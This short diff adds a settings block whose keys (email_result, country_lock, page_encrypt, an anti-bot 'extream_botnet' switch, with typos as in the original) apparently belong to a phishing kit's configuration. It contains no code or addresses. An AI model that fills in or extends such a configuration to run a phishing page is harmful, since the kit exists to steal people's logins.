@@ -1,0 +1,8 @@
+[setting]
+license         = ''
+email_result    = ''
+country_lock    = ''
+login_account   = ''
+create_passwrod = 'on'
+page_encrypt    = 'on'
+extream_botnet  = ''
